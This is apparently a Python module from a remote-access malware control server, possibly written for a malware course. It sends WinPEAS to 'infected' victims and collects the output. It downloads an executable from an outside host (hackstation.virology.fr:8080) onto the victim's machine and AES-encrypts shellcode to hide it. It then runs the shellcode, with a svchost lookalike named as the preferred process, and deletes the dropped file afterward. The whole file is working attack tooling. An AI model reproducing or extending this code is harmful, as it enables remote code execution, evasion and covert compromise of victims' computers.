from dataManager.repository.userRepository import UserRepository
import logging
import binascii
import asyncio
from Crypto.Cipher import AES

class ExploitModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "exploit"
        self.user_repository: UserRepository = user_repository

    async def peas_receive_socket(self, message, uuid):
        module_data = self.user_repository.get_user(uuid).get_module_data(self.module_name)
        if "peas" not in module_data:
            module_data["peas"] = ""
        new_peas_data = module_data["peas"] + message
        new_module_data = module_data
        new_module_data["peas"] = new_peas_data
        self.user_repository.set_user_module_data(uuid, self.module_name, new_module_data)
        return {"message": "peas data updated"}
    
    async def send_peas(self, uuid):
        user = self.user_repository.get_user(uuid)
        await user.execute("./modules/payloads/payload_winpeas.py")
        return {"message": "WinPEAS sent"}
    
    async def receive_peas(self, uuid):
        module_data = self.user_repository.get_user(uuid).get_module_data(self.module_name, "")
        if "peas" not in module_data:
            return {"message": "No peas data found"}
        return {"message": module_data["peas"]}
    
    async def _download_shellcode_executable(self, uuid, url: str, output_dir: str):
        user = self.user_repository.get_user(uuid)
        if not user:
            raise Exception(f"Victim is not infected")
        logging.info(f"Downloading shellcode executable from {url} to {output_dir}")
        result = await user.execute("./modules/payloads/payload_download_file.py", {
            b"TO_REPLACE_WITH_URL": url.encode(),
            b"TO_REPLACE_WITH_OUTPUT_DIR": output_dir.encode()
        })
        logging.info(f"Shellcode executable downloaded")
        return result
    
    def _encrypt_shellcode(self, shellcode: str):
        # Read key and IV from binary files
        with open('./bin/aes_key.bin', 'rb') as f:
            key = f.read()
        with open('./bin/aes_iv.bin', 'rb') as f:
            iv = f.read()
            
        # Create cipher object and encrypt the data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        # Convert string to bytes and pad to AES block size
        data = shellcode.encode()
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length
        
        # Encrypt and convert to hex
        encrypted = cipher.encrypt(data)
        return binascii.hexlify(encrypted).decode()
    
    async def _remove_file(self, uuid, file_path: str):
        user = self.user_repository.get_user(uuid)
        if not user:
            raise Exception(f"Victim is not infected")
        await user.execute("./modules/payloads/exploit/payload_remove_file.py", {
            b"TO_REPLACE_WITH_FILE_PATH": file_path.encode()
        })
        return {"message": "File removed"}


    
    async def exec_shellcode(self, uuid, shellcode_x86: str, shellcode_x64:str, method: str = "self-exec", prefered_process:str = "scvhost.exe"):
        user = self.user_repository.get_user(uuid)
        if not user:
            raise Exception(f"Victim is not infected")
        await self._download_shellcode_executable(uuid, "https://hackstation.virology.fr:8080/python3.7.exe", ".")
        shellcode = self._encrypt_shellcode(shellcode_x64)
        logging.info(f"Shellcode:{shellcode}...")
        logging.info(f"Sending payload...")
        logging.info(f"Shellcode: {shellcode} (type: {type(shellcode)})")
        await asyncio.sleep(5)
        result = await user.execute("./modules/payloads/exploit/payload_exec_shellcode.py", {
            b"TO_REPLACE_WITH_SHELLCODE": shellcode.encode(),
        })
        await self._remove_file(uuid, "python3.7.exe")
        logging.info(f"Payload sent")
        return {"message": result}
    
        
